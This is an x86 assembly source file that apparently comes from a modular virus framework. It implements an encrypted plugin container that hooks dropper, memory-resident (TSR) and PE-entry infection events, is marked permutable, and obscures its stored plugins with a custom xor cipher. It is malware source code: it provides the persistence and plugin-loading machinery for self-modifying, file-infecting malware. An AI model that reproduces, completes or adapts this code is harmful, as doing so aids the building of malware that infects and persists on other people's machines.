   ; PGNCONT
   ; ~~~~~~~
   ; - new plugin external container

   CONTAINER_SIZE          equ     262144          ; 256k

   include                 INCLUDE\consts.inc
   include                 INCLUDE\s2c.inc
   include                 dropper.inc
   include                 tsr.inc
   include                 util.inc
   include                 memory.inc
   include                 plugman.inc
   include                 pentry.inc

   include                 plugin.inc
                           PLUGIN_START    PGNCONT, CODE32, PERMUTABLE

   handleevent:            hookevent EV_PGNCONT_ADDPLUGIN, addplugin
                           hookevent EV_PENTRY_START_IN_PE, loadall
                           hookevent EV_DROPPER_START_MAIN, loadall
                           hookevent EV_TSR_IN_NEW_ADDR, loadall
                           stc
                           retn

   ; input: ESI=plugin

   addplugin:              pusha

                           call    alloccontainer
                           call    loadcontainer

   ; check if such plugin present.
   ; plugin in ESI, plugin set in EDX

                           mov     edi, edx

   __cycle:                cmp     [edi].plugin_size, 0
                           je      __add

                           mov     eax, [esi].plugin_id
                           cmp     eax, [edi].plugin_id
                           jne     __cont
                           mov     eax, [esi].plugin_version
                           cmp     eax, [edi].plugin_version
                           jbe     __free       ; current ver <= stored ver
                           ; disable lower-version plugin
                           or      [edi].plugin_flags, FL_PGN_DISABLED

   __cont:                 add     edi, [edi].plugin_size
                           jmp     __cycle

   __add:                  mov     ecx, [esi].plugin_size

                           lea     eax, [edx+CONTAINER_SIZE-4]
                           sub     eax, edi
                           ; not enough memory?
                           cmp     eax, ecx
                           jbe     __free

                           cld
                           rep     movsb

                           call    savecontainer

   __free:                 call    freecontainer

                           popa
                           clc
                           retn

   loadall:                pusha

                           call    alloccontainer
                           call    loadcontainer

                           mov     esi, edx

   __cycle:                cmp     [esi].plugin_size, 0
                           je      __exit

                           event   EV_PLUGMAN_ADD_EX

                           add     esi, [esi].plugin_size
                           jmp     __cycle
   __exit:
                           call    freecontainer

                           popa
                           stc     ; keep event
                           retn


   ; input: EDX=container data

   loadcontainer:          pusha

                           mov     esi, XFILE_3
                           mov     ecx, CONTAINER_SIZE
                           event   EV_UTIL_BLOAD_EX
                           or      eax, eax
                           jz      __exit

                           call    xcrypt  ; edx/ecx

   __exit:                 popa
                           retn

   ; input: EDX=container data

   savecontainer:          pusha

                           mov     esi, XFILE_3    ; esi=filename
                           mov     ecx, CONTAINER_SIZE

                           call    xcrypt  ; edx/ecx

                           event   EV_UTIL_BSAVE_EX

                           popa
                           retn

   ; output: EDX=container data

   alloccontainer:         pusha

                           mov     ecx, CONTAINER_SIZE
                           event   EV_MEMORY_MALLOC

                           mov     [esp].popa_edx, edx
                           popa
                           retn

   ; input: EDX=container data

   freecontainer:          pusha

                           event   EV_MEMORY_MFREE

                           popa
                           retn

   ; input: EDX/ECX

   xcrypt:                 pusha
                           mov     eax, ecx
                           shr     ecx, 2
   __cycle:                xor     [edx], eax
                           ;;
                           ror     eax, cl
                           imul    eax, eax
                           sub     eax, ecx
                           ;;
                           add     edx, 4
                           loop    __cycle
                           popa
                           retn

                           PLUGIN_END
